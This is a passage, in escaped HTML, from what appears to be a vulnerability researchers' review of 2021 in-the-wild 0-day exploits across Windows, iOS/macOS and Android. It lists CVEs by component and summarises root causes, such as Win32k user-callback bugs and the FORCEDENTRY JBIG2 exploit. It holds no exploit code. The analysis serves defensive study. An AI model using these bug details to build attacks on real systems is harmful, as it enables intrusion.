46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;2 Enhanced crypto provider (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31199"&gt;CVE-2021-31199&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31201"&gt;CVE-2021-31201&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;2 NTOS kernel (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33771"&gt;CVE-2021-33771&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31979"&gt;CVE-2021-31979&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;2 Win32k (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html"&gt;CVE-2021-1732&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/"&gt;CVE-2021-40449&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 Windows update medic (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36948"&gt;CVE-2021-36948&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;) &lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 SuperFetch (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31955"&gt;CVE-2021-31955&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 dwmcore.dll (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28310"&gt;CVE-2021-28310&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_718o7hzyu4f-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;1 ntfs.sys (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31956"&gt;CVE-2021-31956&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;The number of different components targeted is the shift from past years. For example, in 2019 75% of Windows 0-days targeted Win32k while in 2021 Win32k only made up 20% of the Windows 0-days. The reason that this was expected and predicted was that 6 out of 8 of those 0-days that targeted Win32k in 2019 did not target the latest release of Windows 10 at that time; they were targeting older versions. With Windows 10 Microsoft began dedicating more and more resources to locking down the attack surface of Win32k so as those older versions have hit end-of-life, Win32k is a less and less attractive attack surface.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Similar to the many Win32k vulnerabilities seen over the years, the &lt;/span&gt;&lt;span&gt;two 2021 Win32k in-the-wild 0-days are due to custom user callbacks&lt;/span&gt;&lt;span&gt;. The user calls functions that change the state of an object during the callback and Win32k does not correctly handle those changes. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html"&gt;CVE-2021-1732&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a type confusion vulnerability due to a user callback in &lt;/span&gt;&lt;span class="HNYIspzEBn-c10"&gt;xxxClientAllocWindowClassExtraBytes&lt;/span&gt;&lt;span&gt;&amp;nbsp;which leads to out-of-bounds read and write. If &lt;/span&gt;&lt;span class="HNYIspzEBn-c10"&gt;NtUserConsoleControl&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called during the callback a flag is set in the window structure to signal that a field is an offset into the kernel heap. &lt;/span&gt;&lt;span class="HNYIspzEBn-c10"&gt;xxxClientAllocWindowClassExtraBytes&lt;/span&gt;&lt;span&gt;&amp;nbsp;doesn&amp;rsquo;t check this and writes that field as a user-mode pointer without clearing the flag. The first in-the-wild 0-day detected and disclosed in 2022, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-21882.html"&gt;CVE-2022-21882&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, is due to &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html"&gt;CVE-2021-1732&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;actually not being fixed completely. The attackers found a way to bypass the original patch and still trigger the vulnerability. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/"&gt;CVE-2021-40449&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a use-after-free in &lt;/span&gt;&lt;span class="HNYIspzEBn-c10"&gt;NtGdiResetDC&lt;/span&gt;&lt;span&gt;&amp;nbsp;due to the object being freed during the user callback. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.dzyrqam42oqk"&gt;&lt;span class="HNYIspzEBn-c12"&gt;iOS/macOS&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;As discussed in the &amp;ldquo;More disclosure&amp;rdquo; section above, 2021 was the first full year that Apple annotated their release notes with in-the-wild status of vulnerabilities. 5 iOS in-the-wild 0-days were detected and disclosed this year. The first publicly known macOS in-the-wild 0-day (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/"&gt;CVE-2021-30869&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;) was also found. In this section we&amp;rsquo;re going to discuss iOS and macOS together because: 1) the two operating systems include similar components and 2) the sample size for macOS is very small (just this one vulnerability).&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxy_vsgAqv3MzrONfxltvMnnsPyONg6TGwm_XGBKBDrRrmjYmFQoSaBcjCAt5wH05oW9Bj531mWuO8l2MmKieN4O0Y--EXSGjsIMEfjUg_CAbBgkKic0_q6ezw0TMbQIaQP0zz9GiguCjQlEUwwtYBv5UOFL6HTMpdMS15v63QYSnG_zxowe7Gcz01lg/s1200/image6.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxy_vsgAqv3MzrONfxltvMnnsPyONg6TGwm_XGBKBDrRrmjYmFQoSaBcjCAt5wH05oW9Bj531mWuO8l2MmKieN4O0Y--EXSGjsIMEfjUg_CAbBgkKic0_q6ezw0TMbQIaQP0zz9GiguCjQlEUwwtYBv5UOFL6HTMpdMS15v63QYSnG_zxowe7Gcz01lg/s600/image6.png" border="0" alt="Bar graph showing the number of macOS and iOS itw 0-days discovered per year. macOs is 0 for every year except 2021 when 1 was discovered. iOS - 2015: 0, 2016: 2, 2017: 0, 2018: 2, 2019: 0, 2020: 3, 2021: 5. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600;"title="Bar graph showing the number of macOS and iOS itw 0-days discovered per year. macOs is 0 for every year except 2021 when 1 was discovered. iOS - 2015: 0, 2016: 2, 2017: 0, 2018: 2, 2019: 0, 2020: 3, 2021: 5. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;For the 5 total iOS and macOS in-the-wild 0-days&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;, they targeted 3 different attack surfaces:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_givsp5ka59r-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;IOMobileFrameBuffer (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212623"&gt;CVE-2021-30807&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212846"&gt;CVE-2021-30883&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;XNU Kernel (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212146"&gt;CVE-2021-1782&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;amp; &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/"&gt;CVE-2021-30869&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;CoreGraphics (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html"&gt;CVE-2021-30860&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html"&gt;FORCEDENTRY sandbox escape&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;- CVE requested, not yet assigned)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;These 4 attack surfaces are not novel. IOMobileFrameBuffer has been a target of public security research for many years. For example, &lt;/span&gt;&lt;span&gt;the Pangu Jailbreak from 2016 used &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://www.blackhat.com/docs/us-16/materials/us-16-Wang-Pangu-9-Internals.pdf"&gt;CVE-2016-4654&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a heap buffer overflow in IOMobileFrameBuffer.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;IOMobileFrameBuffer manages the screen&amp;rsquo;s frame buffer. For iPhone 11 (A13) and below, IOMobileFrameBuffer was a kernel driver. Beginning with A14, it runs on a coprocessor, the DCP. &amp;nbsp;It&amp;rsquo;s a popular attack surface because historically it&amp;rsquo;s been accessible from sandboxed apps. In 2021 there were two in-the-wild 0-days in IOMobileFrameBuffer. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212623"&gt;CVE-2021-30807&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an out-of-bounds read and &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212846"&gt;CVE-2021-30883&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an integer overflow, both common memory corruption vulnerabilities. In 2022, we already have another in-the-wild 0-day in IOMobileFrameBuffer, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT213053"&gt;CVE-2022-22587&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;One iOS 0-day and the macOS 0-day both exploited vulnerabilities in the XNU kernel and both vulnerabilities were in code related to XNU&amp;rsquo;s inter-process communication (IPC) functionality. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212146"&gt;CVE-2021-1782&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;exploited a vulnerability in mach vouchers while &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/"&gt;CVE-2021-30869&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;exploited a vulnerability in mach messages. This is not the first time we&amp;rsquo;ve seen &lt;/span&gt;&lt;span&gt;iOS in-the-wild 0-days&lt;/span&gt;&lt;span&gt;, much less public security research, targeting mach vouchers and mach messages. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT209443"&gt;CVE-2019-6625&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was exploited as a part of &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-5.html"&gt;an exploit chain targeting iOS 11.4.1-12.1.2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and was also a &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2019/01/voucherswap-exploiting-mig-reference.html"&gt;vulnerability in mach vouchers&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;Mach messages have also been a popular target for public security research. In 2020 there were two in-the-wild 0-days also in mach messages: &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html"&gt;CVE-2020-27932&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;amp; &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27950.html"&gt;CVE-2020-27950&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This year&amp;rsquo;s &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/"&gt;CVE-2021-30869&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a pretty close variant to 2020&amp;rsquo;s &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html"&gt;CVE-2020-27932&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Tielei Wang and Xinru Chi actually &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://github.com/wangtielei/Slides/blob/main/zer0con21.pdf"&gt;presented on this vulnerability at zer0con 2021&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in April 2021. In their presentation, they explained that they found it while doing variant analysis on &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html"&gt;CVE-2020-27932&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://twitter.com/WangTielei/status/1486266258152726530"&gt;TieLei Wang explained via Twitter&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;that they had found the vulnerability in December 2020 and had noticed it was fixed in beta versions of iOS 14.4 and macOS 11.2 which is why they presented it at Zer0Con. The in-the-wild exploit only targeted macOS 10, but used the same exploitation technique as the one presented.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;The two FORCEDENTRY exploits (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html"&gt;CVE-2021-30860&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and the &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html"&gt;sandbox escape&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) were the only times that made us all go &amp;ldquo;wow!&amp;rdquo; this year. For &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html"&gt;CVE-2021-30860&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the integer overflow in CoreGraphics, it was because: &lt;/span&gt;&lt;/p&gt;&lt;ol class="c6 lst-kix_qhs0t3wlsx02-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;For years we&amp;rsquo;ve all heard about how attackers are using 0-click iMessage bugs and finally we have a public example, and&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span class="HNYIspzEBn-c0"&gt;The exploit was an impressive work of art. &lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;The sandbox escape (CVE requested, not yet assigned) was impressive because it&amp;rsquo;s one of the few times we&amp;rsquo;ve seen a sandbox escape in-the-wild that uses only logic bugs, rather than the standard memory corruption bugs. &lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;For &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html"&gt;CVE-2021-30860&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the vulnerability itself wasn&amp;rsquo;t especially notable: a classic integer overflow within the JBIG2 parser of the CoreGraphics PDF decoder. The exploit, though, was described by Samuel Gro&amp;szlig; &amp;amp; Ian Beer as &amp;ldquo;one of the most technically sophisticated exploits [they]&amp;rsquo;ve ever seen&amp;rdquo;. &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html"&gt;Their blogpost shares all the details&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;, but the highlight is that the exploit uses the logical operators available in JBIG2 to build NAND gates which are used to build its own computer architecture. The exploit then writes the rest of its exploit using that new custom architecture. From their blogpost:&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5 HNYIspzEBn-c15"&gt;&lt;span class="HNYIspzEBn-c8"&gt;Using over 70,000 segment commands defining logical bit operations, they define a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations. It&amp;#39;s not as fast as Javascript, but it&amp;#39;s fundamentally computationally equivalent.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2 HNYIspzEBn-c15"&gt;&lt;span class="HNYIspzEBn-c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5 HNYIspzEBn-c15"&gt;&lt;span class="HNYIspzEBn-c8"&gt;The bootstrapping operations for the sandbox escape exploit are written to run on this logic circuit and the whole thing runs in this weird, emulated environment created out of a single decompression pass through a JBIG2 stream. It&amp;#39;s pretty incredible, and at the same time, pretty terrifying.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;This is an example of what &lt;/span&gt;&lt;span&gt;making 0-day exploitation hard could&lt;/span&gt;&lt;span&gt;&amp;nbsp;look like:&lt;/span&gt;&lt;span&gt;&amp;nbsp;attackers having to develop a new and novel way to exploit a bug and that method requires lots of expertise and/or time to develop.&lt;/span&gt;&lt;span&gt;&amp;nbsp;This year, the two FORCEDENTRY exploits were the only 0-days out of the 58 that really impressed us. Hopefully in the future, the bar has been raised such that this will be required for any successful exploitation.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="HNYIspzEBn-c7" id="h.tyseasm1qg7w"&gt;&lt;span class="HNYIspzEBn-c12"&gt;Android&lt;/span&gt;&lt;/h2&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;There were 7 Android in-the-wild 0-days detected and disclosed this year. Prior to 2021 there had only been 1 and it was in 2019: &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-2215.html"&gt;CVE-2019-2215&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;. Like WebKit, this lack of data makes it hard for us to assess trends and changes. Instead, we&amp;rsquo;ll compare it to public security research.&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span class="HNYIspzEBn-c0"&gt;For the 7 Android 0-days they targeted the following components:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c6 lst-kix_3zaknyhdqv25-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;Qualcomm Adreno GPU driver (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-01-01"&gt;CVE-2020-11261&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1905.html"&gt;CVE-2021-1905&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-05-01"&gt;CVE-2021-1906&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;ARM Mali GPU driver (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-05-01"&gt;CVE-2021-28663&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-05-01"&gt;CVE-2021-28664&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 li-bullet-0"&gt;&lt;span&gt;Upstream Linux kernel (&lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html"&gt;CVE-2021-1048&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="HNYIspzEBn-c1"&gt;&lt;a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-11-01#kernel-components"&gt;CVE-2021-0920&lt;/a&gt;&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;)&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="HNYIspzEBn-c2"&gt;&lt;span class="HNYIspzEBn-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="HNYIspzEBn-c5"&gt;&lt;span&gt;5 of the 7 0-days from 2021 targeted GPU drivers. This is actually not that surprising when we consider the evolution of the Android ecosystem as well as recent public security research into Android. The Android ecosystem is quite &lt;/span&gt;&lt;span&gt;fragmented&lt;/span&gt;&lt;span class="HNYIspzEBn-c0"&gt;: many different kernel versions, different manufacturer customizations, etc. If an attacker wants a capability against &amp;ldquo;Android devices&amp;rdquo;, they generally need to maintain many different exploits to have a decent percentage of the Android ecosystem covered. However, if the attacker chooses to target the GPU kernel driver instead of another component, they will only need to have two exploits since most Android devices use 1 of 2 GPUs: either the 